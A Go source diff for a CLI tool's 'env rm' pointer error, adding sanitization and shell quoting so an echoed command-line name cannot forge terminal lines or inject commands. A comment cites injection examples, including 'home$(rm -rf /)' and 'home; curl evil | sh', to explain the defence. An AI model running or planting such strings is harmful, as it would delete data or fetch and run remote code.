@@ -27,6 +27,7 @@ package main
 import (
 	"fmt"
 	"strings"
+	"unicode"
 
 	"pix/host/cli"
 	"pix/host/sys"
@@ -83,7 +84,7 @@ unless --yes.`
 type envCmd struct {
 	Ls     envLsCmd     `cmd:"" default:"1" help:"List registered environments. Marks the default."`
 	Add    envAddCmd    `cmd:"" help:"Register a directory, or scaffold a new one, then review it."`
-	Use    envUseCmd    `cmd:"" help:"Set the machine default. Refuses an unreviewed or changed environment."`
+	Use    envUseCmd    `cmd:"" help:"Set the machine default. Refuses an unaccepted Tier1 environment, or one whose footprint changed since review."`
 	Show   envShowCmd   `cmd:"" help:"What NAME is: files, models, mounts, MCP, review state, drift."`
 	Edit   envEditCmd   `cmd:"" help:"Open pix.toml or .sbxenv.yaml in $VISUAL/$EDITOR, then validate."`
 	Review envReviewCmd `cmd:"" help:"Read and accept what NAME runs on your host."`
@@ -352,28 +353,139 @@ func (c *envForgetCmd) Run(d *cli.Deps) error {
 
 // ── rm: the pointer error, not a working alias ──────────────────────────
 
+// rmPointerMaxNameLen caps how many runes of the typed NAME
+// envRmPointerError will ever echo back. config.environmentNameRE already
+// caps a REAL registered name at 128 runes; this pointer never reads the
+// registry at all (see envRmCmd's own doc comment), so it has no such gate
+// of its own — this constant is that same bound, applied to untrusted argv
+// instead, so a pathological invocation cannot blow up a two-line
+// diagnostic.
+const rmPointerMaxNameLen = 128
+
+// rmPointerFallbackName is what envRmPointerError names when `pix env rm`
+// carried no usable NAME at all (bare `pix env rm`, or only flag-shaped
+// tokens after it) — the bare word this file's OWN help text already uses
+// for the identical role everywhere else a verb takes a name (Forget's
+// `help:"Unregister NAME. ..."`, Edit's `'edit NAME pix|sbxenv'`), never
+// the `<name>` bracket form docs/design/environments.md §8.1's OTHER
+// generic fix lines use for a name the user has not chosen yet — there is
+// no fabricated example (never hardcoded "home") standing in for a real
+// answer either way.
+const rmPointerFallbackName = "NAME"
+
+// rmPointerName picks the value envRmPointerError echoes as NAME: the
+// first token in args that does not look like a flag (a leading "-") —
+// envRmCmd.Args swallows flags and positional garbage alike, so `pix env
+// rm --force home` must still point at "home", not "--force". No candidate
+// at all (args empty, or entirely flag-shaped) answers rmPointerFallbackName
+// rather than fabricating one.
+func rmPointerName(args []string) string {
+	for _, a := range args {
+		if a == "" || strings.HasPrefix(a, "-") {
+			continue
+		}
+		return sanitizeRmPointerName(a)
+	}
+	return rmPointerFallbackName
+}
+
+// sanitizeRmPointerName turns raw argv text into safe display copy for the
+// rm pointer error. envRmCmd.Run reads nothing and validates nothing (its
+// own doc comment: zero config reads, zero mutation) — unlike every other
+// `pix env` verb's Name, which config.validEnvironmentName gates before it
+// ever reaches a printed line, this NAME is untrusted input echoed straight
+// from the command line. Any Unicode control character (a bare newline or
+// carriage return that would forge an extra line of terminal output, an
+// ESC that could start a terminal escape sequence, a tab that could fake
+// column alignment, ...) is DROPPED outright rather than replaced, and the
+// result is capped to rmPointerMaxNameLen runes. This only keeps the
+// OUTPUT ITSELF from being control-character- or fake-extra-line-shaped;
+// it says nothing about shell metacharacters ($(...), ;, `, |, ...) that
+// pass through unremoved — that is envRmPointerError's job (sys.ShellQuote
+// on this function's already-sanitized result), not this one's: control
+// stripping and shell quoting are two different threats (forged terminal
+// output vs. forged shell command) and stay two different, independently
+// testable steps.
+func sanitizeRmPointerName(raw string) string {
+	var b strings.Builder
+	n := 0
+	for _, r := range raw {
+		if unicode.IsControl(r) {
+			continue
+		}
+		if n >= rmPointerMaxNameLen {
+			break
+		}
+		b.WriteRune(r)
+		n++
+	}
+	return b.String()
+}
+
 // envRmPointerError is docs/design/environments.md §8.1's exact rm refusal
-// (PRD §5.5), verbatim: it names the three distinct things a user might
-// actually want removed, so the wrong one is never removed by accident.
-const envRmPointerError = "pix: `pix env rm` does not exist. Registering a name is not owning the files.\n" +
-	"     pix env forget home     unregister the name (deletes no files)\n" +
-	"     pix rm pix-repo-home    remove the sandbox\n" +
-	"     rm -rf <path>           delete the source yourself; pix will not\n"
+// (PRD §5.5): it names the three distinct things a user might actually
+// want removed, so the wrong one is never removed by accident. name is
+// rmPointerName's already-sanitized pick (control characters already
+// dropped, length already capped) — sys.ShellQuote runs over it HERE,
+// after that sanitization, before either interpolation below: a fix line
+// is meant to be copy-pasted straight into a real shell, so untrusted argv
+// text embedded in it (a `home$(rm -rf /)` or `home; curl evil | sh`
+// typo-turned-argument) MUST tokenize as one inert literal word there, not
+// as a command substitution or a second command. sys.ShellQuote leaves an
+// already-safe token (letters, digits, and the usual name punctuation)
+// untouched, so every existing plain-name fix line prints identically to
+// before; it single-quotes anything else. Both the forget line's name and
+// the rm line's sandbox token get the SAME quoted value — quoting only the
+// interpolated tail of `pix-repo-%s` is syntactically fine (an unquoted
+// literal prefix directly abutting a quoted tail is one shell word, exactly
+// as sys.ShellSplit's own doc comment describes), and it is this pointer's
+// only structural link to `pix-repo-<name>`; see that literal's own comment
+// below for why it stays `pix-repo-`, not today's actual sandbox-naming
+// scheme. The delete-source line stays the fixed `<path>` placeholder,
+// since there is no environment root to name at all here (this command
+// never resolves one).
+func envRmPointerError(name string) string {
+	q := sys.ShellQuote(name)
+	return fmt.Sprintf("pix: `pix env rm` does not exist. Registering a name is not owning the files.\n"+
+		"     pix env forget %s   unregister the name (deletes no files)\n"+
+		"     pix rm pix-repo-%s   remove the sandbox\n"+
+		"     rm -rf <path>   delete the source yourself; pix will not\n", q, q)
+}
+
+// The `pix-repo-` prefix above is PRD §5.5's frozen sandbox-naming
+// contract for an environment-launched sandbox, not a description of any
+// sandbox that exists today: NO env-driven launch cutover exists yet (Wave
+// D — see workflow/env/forget.go's identical "no live sandbox anywhere
+// associates itself with an environment NAME yet" note on HolderProbe),
+// so `pix rm pix-repo-work` currently names a sandbox that never gets
+// created by anything in this tree. It is NOT the same string
+// resolveSandboxName/sandbox.Name produces today for an ordinary `pix run`
+// (the generic, digest-suffixed `pix-<basename>-<8-hex digest>`, e.g.
+// `pix-work-a1b2c3d4`) — that is a DIFFERENT, pre-Wave-D naming scheme for
+// a workspace directory, answering a different question ("which directory
+// did you launch from") than this one ("which environment is this
+// sandbox's identity"). Do not "fix" pix-repo-%s here to match
+// sandbox.Name's current output: the two are deliberately decoupled until
+// Wave D wires an environment-identified sandbox naming path, and until
+// then this line is aspirational spec text, not a bug.
 
 // envRmCmd exists only to give kong a deterministic node to dispatch `pix
 // env rm ...` TO — see this struct field's own comment on envCmd. Args
 // swallows anything after `rm` (a name, flags, garbage) so no shape of
 // invocation ever falls through to kong's own "unexpected argument";
-// every one of them lands here and gets the SAME pointer error. Run reads
-// no config, resolves no name, and touches no file: this command performs
-// ZERO mutation of any kind before returning its fixed exit 2, exactly
-// because it never earns the chance to — there is nothing here it could
-// even ask permission for.
+// every one of them lands here and gets the SAME pointer error, naming
+// whatever NAME rmPointerName picks out of it. Run reads no config,
+// resolves no name against the real registry, and touches no file: this
+// command performs ZERO mutation of any kind before returning its fixed
+// exit 2, exactly because it never earns the chance to — there is nothing
+// here it could even ask permission for. That holds regardless of what
+// argv it was handed: rmPointerName/sanitizeRmPointerName above only shape
+// what gets PRINTED, never anything this Run reads back or acts on.
 type envRmCmd struct {
 	Args []string `arg:"" optional:"" passthrough:"" hidden:""`
 }
 
 func (c *envRmCmd) Run(d *cli.Deps) error {
-	fmt.Fprint(d.Err, envRmPointerError)
+	fmt.Fprint(d.Err, envRmPointerError(rmPointerName(c.Args)))
 	return cli.SilentError{Code: 2}
 }
